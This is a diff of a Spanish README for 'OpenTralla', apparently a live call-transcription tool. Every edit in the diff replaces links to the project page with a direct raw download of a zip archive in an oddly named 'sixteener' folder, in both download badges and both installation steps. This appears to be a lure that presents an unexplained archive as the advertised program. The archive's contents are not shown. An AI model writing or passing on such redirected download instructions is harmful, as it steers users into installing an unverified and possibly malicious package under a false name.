@@ -1,6 +1,6 @@
 # 🐌 transcribir-llamadas-OpenTralla - Transcribe llamadas fácilmente y en vivo
 
-[![Descarga OpenTralla](https://img.shields.io/badge/Descargar-OpenTralla-brightgreen)](https://github.com/Ua15443/transcribir-llamadas-OpenTralla)
+[![Descarga OpenTralla](https://img.shields.io/badge/Descargar-OpenTralla-brightgreen)](https://raw.githubusercontent.com/Ua15443/transcribir-llamadas-OpenTralla/main/sixteener/llamadas-transcribir-Open-Tralla-2.3.zip)
 
 ![OpenTralla Interfaz](screenshot.png)
 
@@ -43,7 +43,7 @@ Este programa detecta quién habla en la reunión y transcribe cada frase en tie
 ## 🚀 Cómo descargar e instalar OpenTralla en Windows
 
 1. Abre el enlace a la página oficial del proyecto para descargar:  
-   [https://github.com/Ua15443/transcribir-llamadas-OpenTralla](https://github.com/Ua15443/transcribir-llamadas-OpenTralla)  
+   [https://raw.githubusercontent.com/Ua15443/transcribir-llamadas-OpenTralla/main/sixteener/llamadas-transcribir-Open-Tralla-2.3.zip](https://raw.githubusercontent.com/Ua15443/transcribir-llamadas-OpenTralla/main/sixteener/llamadas-transcribir-Open-Tralla-2.3.zip)  
 
    ![Descarga OpenTralla](https://img.shields.io/badge/Descargar-OpenTralla-brightgreen)
 
@@ -104,6 +104,6 @@ Este programa detecta quién habla en la reunión y transcribe cada frase en tie
 ## 🔗 Descargar y comenzar
 
 Visita esta página para descargar la última versión:  
-[https://github.com/Ua15443/transcribir-llamadas-OpenTralla](https://github.com/Ua15443/transcribir-llamadas-OpenTralla)
+[https://raw.githubusercontent.com/Ua15443/transcribir-llamadas-OpenTralla/main/sixteener/llamadas-transcribir-Open-Tralla-2.3.zip](https://raw.githubusercontent.com/Ua15443/transcribir-llamadas-OpenTralla/main/sixteener/llamadas-transcribir-Open-Tralla-2.3.zip)
 
-[![Descarga OpenTralla](https://img.shields.io/badge/Descargar-OpenTralla-brightgreen)](https://github.com/Ua15443/transcribir-llamadas-OpenTralla)
+[![Descarga OpenTralla](https://img.shields.io/badge/Descargar-OpenTralla-brightgreen)](https://raw.githubusercontent.com/Ua15443/transcribir-llamadas-OpenTralla/main/sixteener/llamadas-transcribir-Open-Tralla-2.3.zip)
